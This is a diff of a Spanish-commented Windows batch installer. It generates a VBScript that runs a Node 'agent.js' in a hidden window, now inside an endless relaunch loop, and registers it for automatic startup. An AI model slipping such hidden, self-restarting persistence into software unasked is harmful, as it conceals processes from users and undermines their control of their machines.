@@ -8,7 +8,10 @@ xcopy /E /Y "%~dp0*" "%DEST%\"
 
 :: 2. Crear el archivo invisible .vbs automaticamente
 echo Set WshShell = CreateObject("WScript.Shell") > "%DEST%\silencioso.vbs"
-echo WshShell.Run "cmd /c node %%DEST%%\agent.js", 0 >> "%DEST%\silencioso.vbs"
+echo Do >> "%DEST%\silencioso.vbs"
+echo   WshShell.Run "cmd /c node %%DEST%%\agent.js", 0, True >> "%DEST%\silencioso.vbs"
+echo   WScript.Sleep 2000 >> "%DEST%\silencioso.vbs"
+echo Loop >> "%DEST%\silencioso.vbs"
 echo Set WshShell = Nothing >> "%DEST%\silencioso.vbs"
 
 :: 3. Ponerlo en Inicio automatico de Windows
